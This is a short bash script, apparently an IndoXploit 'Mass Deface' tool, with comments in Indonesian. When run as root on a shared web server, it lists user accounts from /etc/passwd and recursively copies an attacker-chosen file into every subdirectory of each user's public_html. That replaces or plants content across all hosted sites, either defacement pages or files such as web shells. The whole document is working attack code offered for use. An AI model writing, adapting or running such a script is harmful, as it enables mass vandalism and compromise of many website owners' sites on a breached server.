#!/bin/bash
args=("$@")
UHOME="/home"
FILE=$(pwd)"/"${args[0]}
priv=$([ $(id -u) == 0 ] && echo " here we go..........." || echo " you must root to run this file :)")

echo " ~~~~~     Mass Deface (Recursive)    ~~~~~ "
echo " ~~      Updated for Deep Injection      ~~ "
echo " ~    IndoXploit - Sanjungan Jiwa       ~ "
echo "------ [ usage: ./mass file ] ------"
echo ""
echo $priv
echo ""

if [ -z "$1" ]
then
    echo "usage: ./mass file"
    exit 1
fi

if [ $(id -u) != 0 ]; then
    exit 1
fi

# Mendapatkan list user dengan UID >= 500
_USERS="$(awk -F':' '{ if ( $3 >= 500 ) print $1 }' /etc/passwd)"

for u in $_USERS
do 
    _dir="${UHOME}/${u}/public_html"
    
    # Cek apakah direktori public_html ada
    if [ -d "$_dir" ]
    then
        echo "[!] Scanning subdirectories in: $_dir"
        
        # Mencari semua sub-direktori secara rekursif dan menyalin file
        find "$_dir" -type d | while read -r target_dir
        do
            /bin/cp "$FILE" "$target_dir/"
            if [ -e "$target_dir/$(basename "$FILE")" ]
            then
                echo "[+] sukses -> $target_dir/$(basename "$FILE")"
                # Jika ingin mengubah kepemilikan file secara otomatis, hapus comment di bawah:
                # chown $u:$u "$target_dir/$(basename "$FILE")"
            fi
        done
    fi
done
